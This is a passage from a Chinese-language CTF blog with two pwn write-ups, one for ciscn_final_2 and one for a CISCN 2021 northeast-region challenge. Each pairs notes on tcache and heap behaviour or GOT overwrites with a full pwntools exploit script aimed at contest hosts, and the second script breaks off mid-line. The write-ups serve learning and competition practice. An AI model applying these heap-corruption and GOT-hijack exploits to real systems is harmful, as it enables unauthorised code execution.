<p>②但是最坑爹的就是，scanf申请堆块啊，具体不知道申请多大，但是程序中可以输入99个字符，调试了好久，指定会申请堆块。</p>
<p>③如果直接利用int_chunk上残留的libc地址，但是这时候int_chunk已经被放入到unsortedbin中，结合tcache up和UAF势必会修改int_chunk的fd，然后就会造成unsortedbin被破坏，再加上之后的scanf申请堆块，不会从0x20和0x30的tcache中申请，得，直接崩溃：</p>
<p>malloc(): memory corruption: 0x00007fae88dc8c10 ***\n”</p>
<p>④然后我又想到要不为scanf预留一个chunk到tcache中？这样就不会从unsortedbin中切割了。结果调好久没调出来，果断放弃。</p>
<p>⑤最后灵光一闪，想到干嘛不直接劫持tcache结构体，由于int_chunk被放入unsortedbin中，那么如果int_chunk也在tcache中，就可以使得tcache结构体中0x30链表上留下main_arena+96的指针了啊。这样再申请short_chunk到这里，直接修改指针，再申请int_chunk就会申请到我们修改的地方，这样就不会造成unsortedbin破坏。</p>
<p>▲看了大佬的，还是直接填满tcache省事，不破坏unsortedbin。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_final_2&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;/lib/x86_64-linux-gnu/libc-2.26.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="comment">#32bit:malloc_hook = main_arena-0x18</span></span><br><span class="line"><span class="comment">#32bit:main_arena+56(unsortedbin_addr)</span></span><br><span class="line"><span class="comment">#64bit:main_arena+96(unsortedbin_addr)//88 aslo have</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">malloc_hook = main_arena-0x10</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;__malloc_hook&quot;, malloc_hook)</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;) #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#usually gadget:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">u_gadget1 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x5a</span></span><br><span class="line"><span class="string">u_gadget2 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x40</span></span><br><span class="line"><span class="string">pop_rdi_ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x63</span></span><br><span class="line"><span class="string">ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc_file)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;29139&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc_file)</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;which command?\n&gt; &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="type">Type</span>, con</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="type">Type</span>))</span><br><span class="line">    sa(<span class="string">&quot;your inode number:&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="type">Type</span></span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="type">Type</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="type">Type</span></span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="type">Type</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>(<span class="params">con</span>):</span></span><br><span class="line">    sla(menu,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    <span class="comment">#sa(&quot;at last?\n&quot;,con)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;B&quot;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">2</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;type inode number :&quot;</span>)</span><br><span class="line">heap_low_four = <span class="built_in">int</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line"><span class="keyword">if</span>(heap_low_four&lt;<span class="number">0</span>):</span><br><span class="line">    heap_low_four += <span class="number">0x100000000</span></span><br><span class="line">log.info(<span class="string">&quot;heap_low_four:0x%x&quot;</span>%heap_low_four)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="built_in">str</span>(heap_low_four))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="built_in">str</span>(heap_low_four-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="built_in">str</span>(heap_low_four-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">0x4b1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fill</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">    add(<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">0x51</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="built_in">str</span>(heap_low_four))</span><br><span class="line">add(<span class="number">1</span>,<span class="built_in">str</span>(heap_low_four))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;type inode number :&quot;</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = <span class="built_in">int</span>(ru(<span class="string">&quot;\n&quot;</span>))- <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>, malloc_hook)</span><br><span class="line"></span><br><span class="line">libc_base_four = malloc_hook - obj.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span>(libc_base_four&lt;<span class="number">0</span>):</span><br><span class="line">    libc_base_four += <span class="number">0x100000000</span></span><br><span class="line">heap_base = heap_low_four-<span class="number">0x260</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base_four:0x%x&quot;</span>%libc_base_four)</span><br><span class="line">__IO_2_1_stdin_fileno_addr = libc_base_four+obj.dump(<span class="string">&quot;_IO_2_1_stdin_&quot;</span>)+<span class="number">0x70</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="built_in">str</span>(malloc_hook+<span class="number">0x10</span>+<span class="number">96</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="built_in">str</span>(heap_base+<span class="number">0x50</span>+<span class="number">0x8</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="built_in">str</span>(__IO_2_1_stdin_fileno_addr))</span><br><span class="line">add(<span class="number">2</span>,<span class="built_in">str</span>(__IO_2_1_stdin_fileno_addr))</span><br><span class="line">add(<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>这里我都是int_chunk拿来泄露地址和利用，short_chunk来打辅助。</p>
<p>★另外记录下tcache方面的，tcache根源在于tcache结构体，所以如果tcache的bin中如下：</p>
<p>0x20[]:chunkA-&gt;chunkA.fd=1</p>
<p>那么如果这时候申请chunkA的同时修改chunkA.fd=2，对于的tcache的bin中只会是：</p>
<p>0x20[]:chunkA.fd=1，而不是chunkA.fd=2，因为在malloc时就已经将chunkA.fd=1放到tcache结构体中了，再修改chunkA.fd是没有意义的，只能修改tcache结构体才行。</p>
<p>★还有tcache的cout字段一直是个谜，如果cout&gt;7，tcache的max宏定义没有被改，那么释放后的chunk是不会进入对于的tcache的bin中。但是如果cout&lt;7或者&lt;0，是不会有其他影响的，只会看tcache结构体中对应bin的链表中是不是0x0。是就当没有，有数据则就有chunk在该bin中，不管cout是多少(&lt;7)，并且malloc或者free后会对cout对应加减。(不同libc版本好像又不太一样，具体调试)</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/CISCN2021%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%A4%8D%E7%8E%B0/">CISCN2021东北赛区复现</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>复现之前，先骂两句。SB形式，SB的自己。</p>
<p>1.hard:这道题目最他丫SB，上来运行不起来，环境调半天，还是运行不起来，再加上VPN崩溃，一直连不上，还以为题目本身优点问题，只能先放弃，转头帮忙去了。后来checksec一下才发现依赖是./lib/，也就是当前文件下需要创建一个lib文件夹，里面放上ld-linux-x86-64.so.2才能运行，我可去他大爷的。</p>
<p>给的分挺高，后面想了想也不算难，主要有三个点。</p>
<p>(1)任意写时修改的地方选择。</p>
<p>(2)calloc传入的nnum为0时，不会申请，会返回0。同样也具备mmap的功能。</p>
<p>(3)最开始初始化的时候，setbuf传入的是_IO_2_1_stdxx的结构体，该结构体在调用scanf，get，printf等需要初始化缓冲区的函数时，会写入缓冲区地址，也就是Libc上某个区域，可以借此联合setbuf来泄露地址。</p>
<p>比赛后和学长交流一下，才想到把最后的puts改成main，我真他丫是个SB，然后就很正常了。</p>
<p>①由于Partial Reload，可以改got表，所以先任意写，将puts改成main，循环程序。</p>
<p>②将exit改成init处的setbuf的地方，将setbuf改成printf，这样再进入init的地方时，就会打印处_IO_2_1_stdxx的结构体的值。</p>
<p>③由于打印_IO_2_1_stdxx的结构体的值时，打印处flag之后就会被0x00截断，所以需要修改flag处的值。这里通过calloc输入过大的nnum时会从mmap申请内存，返回的是mmap空间，也就是libc上的地址。同时由于关闭了PIE，偏移不会发生改变，所以直接调试计算偏移即可。</p>
<p>④泄露地址后，同样利用calloc申请mmap的方法，将calloc_got改成one_gadget即可。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_file = <span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">malloc_hook = main_arena-0x10</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;__malloc_hook&quot;, malloc_hook)</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;) #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#usually gadget:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">u_gadget1 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x5a</span></span><br><span class="line"><span class="string">u_gadget2 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x40</span></span><br><span class="line"><span class="string">pop_rdi_ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x63</span></span><br><span class="line"><span class="string">ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process([&#x27;./lib/ld-linux-x86-64.so.2&#x27;, &#x27;./tvstation&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./lib/libc.so.6&quot;&#125;)</span></span><br><span class="line">    <span class="comment">#p = process(binary, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;119.3.81.43&quot;</span>,<span class="string">&quot;49153&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">offset, con</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    sl(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(offset // <span class="number">4</span>))</span><br><span class="line">    ru(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(con))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write2</span>(<span class="params">offset, con</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">0x100000</span>))</span><br><span class="line">    ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(offset // <span class="number">4</span>))</span><br><span class="line">    ru(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(con))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x40078D</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">setbuf_got = elf.got[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">exit_got = elf.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">setbuf_plt = elf.plt[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">calloc_got = elf.got[<span class="string">&#x27;calloc&#x27;</span>]</span><br><span class="line">setbuf_init = <span class="number">0x40086a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;puts_got:0x%x&quot;</span>%puts_got)</span><br><span class="line">log.info(<span class="string">&quot;setbuf_got:0x%x&quot;</span>%setbuf_got)</span><br><span class="line">log.info(<span class="string">&quot;exit_got:0x%x&quot;</span>%exit_got)</span><br><span class="line">log.info(<span class="string">&quot;printf_plt:0x%x&quot;</span>%printf_plt)</span><br><span class="line">log.info(<span class="string">&quot;setbuf_plt:0x%x&quot;</span>%setbuf_plt)</span><br><span class="line">log.info(<span class="string">&quot;calloc_got:0x%x&quot;</span>%calloc_got)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(puts_got,main_addr) <span class="comment">#puts-&gt;main</span></span><br><span class="line">write(setbuf_got,printf_plt) <span class="comment">#setbuf-&gt;printf</span></span><br><span class="line">write(setbuf_got+<span class="number">4</span>,<span class="string">&quot;0&quot;</span>) <span class="comment">#setbuf-&gt;printf</span></span><br><span class="line">write(exit_got,setbuf_init) <span class="comment">#exit-&gt;setbuf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *(0x400854) \n c&quot;)</span></span><br><span class="line">IO_stdin4_mmap = <span class="number">0x5EC974</span> <span class="comment">#without PIE</span></span><br><span class="line">IO_stdin_1_libc = <span class="number">0x1EBA03</span></span><br><span class="line">write2(IO_stdin4_mmap,<span class="number">0x11111111</span>) <span class="comment">#IO_stdin.flag-&gt;0x111111111fbad208b</span></span><br><span class="line">sla(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">256</span>))</span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak - IO_stdin_1_libc</span><br><span class="line">log.info(<span class="string">&quot;libc_base:0x%x&quot;</span>%libc_base)</span><br><span 